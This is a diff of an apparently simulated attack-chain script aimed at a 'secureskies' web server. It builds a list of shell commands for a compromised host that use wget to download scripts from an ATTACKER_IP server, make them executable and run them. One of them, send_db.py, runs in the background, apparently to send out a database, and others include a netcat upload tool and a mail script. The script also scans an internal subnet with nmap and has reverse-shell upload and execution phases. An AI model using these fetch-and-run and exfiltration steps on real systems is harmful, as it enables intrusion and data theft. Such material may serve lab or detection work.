@@ -451,34 +451,28 @@ if __name__ == "__main__":
         time.sleep(2)
     
     # === NETWORK ENUMERATION WITH NMAP ===
+
     COMMANDS = [
-        # Step 1: Get basic system info
+        # Step 1: Get basic system info (as www-data first)
         "pwd",
+        "ls",
         "whoami",
         "hostname",
         "uname -a",
-        
-        # # Step 2: Get network configuration
-        "ip addr show",
-        "ip route show",
-        
-        # Step 2a: Check current directory
-        "pwd",
-        
-        # Step 2b: Navigate to web directory and verify
-        "cd /var/www/secureskies/secureskies && pwd",
+        "cd /var/www/secureskies/secureskies",
+        "ls",
+        "cat custom_upload_cms_script.py",
         
         # Step 2c: Download send_db.py script
-        f"cd /var/www/secureskies/secureskies && wget -T 60 -t 5 --no-check-certificate http://{ATTACKER_IP}:{HTTP_PORT}/attacker_flow/send_db.py -O send_db.py 2>&1",
-        
+        (f"wget -T 60 -t 5 --no-check-certificate http://{ATTACKER_IP}:{HTTP_PORT}/attacker_flow/send_db.py -O send_db.py 2>&1"),
         # Step 2d: Verify download
         "ls -lh /var/www/secureskies/secureskies/send_db.py",
         
         # Step 2e: Make it executable
         "chmod +x /var/www/secureskies/secureskies/send_db.py",
         
-        # Step 2f: Execute send_db.py in background
-        "cd /var/www/secureskies/secureskies && nohup python3 send_db.py > /tmp/send_db.log 2>&1 & echo 'send_db.py started in background'",
+        # Step 2f: Execute send_db.py in background (as student for logging)
+        ("cd /var/www/secureskies/secureskies && nohup python3 send_db.py > /tmp/send_db.log 2>&1 & echo 'send_db.py started in background'"),
         
         # Step 2g: Verify the process is running
         "ps aux | grep send_db.py | grep -v grep",
@@ -535,33 +529,41 @@ if __name__ == "__main__":
     # Step 17: Run nmap scans (reduced to essential scans only)
     COMMANDS.extend([
         # Step 17a: Run nmap on localhost
-        "if [ -d /tmp/nmap_transfer/nmap-x64 ] && [ -f /tmp/nmap_transfer/nmap-x64/nmap ]; then cd /tmp/nmap_transfer/nmap-x64 && pwd && ./nmap -sV 192.168.20.0/24 -vv 2>&1; else echo 'ERROR: Cannot run nmap - files not found'; fi",
+        # "if [ -d /tmp/nmap_transfer/nmap-x64 ] && [ -f /tmp/nmap_transfer/nmap-x64/nmap ]; then cd /tmp/nmap_transfer/nmap-x64 && pwd && ./nmap -sV 192.168.20.0/24 -vv 2>&1; else echo 'ERROR: Cannot run nmap - files not found'; fi",
     
         # Step 17a-1: Download nc_upload_share.py script
         f"cd /tmp/nmap_transfer && wget -T 60 -t 5 --no-check-certificate http://{ATTACKER_IP}:{HTTP_PORT}/attacker_flow/nc_upload_share.py -O nc_upload_share.py 2>&1",
         
         # Step 17a-2: Verify download
         "ls -lh /tmp/nmap_transfer/nc_upload_share.py",
+
+        # Step 17a-3: Download ai_meeting_notes_tracker script
+        f"cd /tmp/nmap_transfer && wget -T 60 -t 5 --no-check-certificate http://{ATTACKER_IP}:{HTTP_PORT}/attacker_flow/ai_meeting_notes_tracker -O ai_meeting_notes_tracker 2>&1",
         
-        # Step 17a-3: Make it executable
+        # Step 17a-4: Verify download of ai_meeting_notes_tracker
+        "ls -lh /tmp/nmap_transfer/ai_meeting_notes_tracker",
+        
+        # Step 17a-5: Make nc_upload_share executable
         "chmod +x /tmp/nmap_transfer/nc_upload_share.py",
         
-        # Step 17a-4: Check if python3 is available
+        # Step 17a-6: Check if python3 is available
         "which python3",
         
-        # Step 17a-5: Execute the script and capture output
+        # Step 17a-7: Execute the script and capture output
         "cd /tmp/nmap_transfer && python3 nc_upload_share.py 2>&1",
         
-        # Step 17a-6: Download mail_test.py script
+        # Step 17a-8: Download mail_test.py script
         f"cd /tmp/nmap_transfer && wget -T 60 -t 5 --no-check-certificate http://{ATTACKER_IP}:{HTTP_PORT}/attacker_flow/mail_test.py -O mail_test.py 2>&1",
         
-        # Step 17a-7: Verify download of mail_test.py
+        # Step 17a-9: Verify download of mail_test.py
         "ls -lh /tmp/nmap_transfer/mail_test.py",
         
-        # Step 17a-8: Make it executable
+        # Step 17a-10: Make it executable
         "chmod +x /tmp/nmap_transfer/mail_test.py",
+
         
-        # Step 17a-9: Execute mail_test.py with captured URL as parameter
+        
+        # Step 17a-11: Execute mail_test.py with captured URL as parameter
         "cd /tmp/nmap_transfer && python3 mail_test.py '{NEXTCLOUD_URL}' 2>&1",
         # Step 18: Show network configuration for reference
         # "ip -4 addr show | grep -oP '(?<=inet\\s)\\d+(\\.\\d+){3}/\\d+'",
@@ -584,7 +586,7 @@ if __name__ == "__main__":
     print("\n" + "="*60)
     print("[PHASE 1] DIRECTORY FUZZING WITH GOBUSTER")
     print("="*60)
-    run_gobuster(TARGET_BASE)
+    # run_gobuster(TARGET_BASE)
     
     print("\n[*] Waiting 3 seconds before pentest traffic simulation...")
     time.sleep(3)
@@ -593,26 +595,26 @@ if __name__ == "__main__":
     print("\n" + "="*60)
     print("[PHASE 2] PENTEST TRAFFIC SIMULATION")
     print("="*60)
-    simulate_pentest_traffic()
+    # simulate_pentest_traffic()
     
-    time.sleep(5)
+    # time.sleep(5)
     
     # === Step 3: Upload reverse shell ===
-    print("\n" + "="*60)
-    print("[PHASE 3] UPLOADING REVERSE SHELL")
-    print("="*60)
+    # print("\n" + "="*60)
+    # print("[PHASE 3] UPLOADING REVERSE SHELL")
+    # print("="*60)
     
-    success, uploaded_path = upload_reverse_shell(TARGET_BASE, FILE_NAME, REVERSE_SHELL_PATH)
+    # success, uploaded_path = upload_reverse_shell(TARGET_BASE, FILE_NAME, REVERSE_SHELL_PATH)
     
-    if success and uploaded_path:
-        TARGET_URL = f"{TARGET_BASE}/{uploaded_path}"
-        print(f"[+] File accessible at: {TARGET_URL}")
-    elif success:
-        print(f"[+] File should be at: {TARGET_URL}")
-    else:
-        print("[-] Upload failed - continuing anyway...")
+    # if success and uploaded_path:
+    #     TARGET_URL = f"{TARGET_BASE}/{uploaded_path}"
+    #     print(f"[+] File accessible at: {TARGET_URL}")
+    # elif success:
+    #     print(f"[+] File should be at: {TARGET_URL}")
+    # else:
+    #     print("[-] Upload failed - continuing anyway...")
     
-    time.sleep(3)
+    # time.sleep(3)
     
     # === Step 4: Execute reverse shell attack ===
     print("\n" + "="*60)
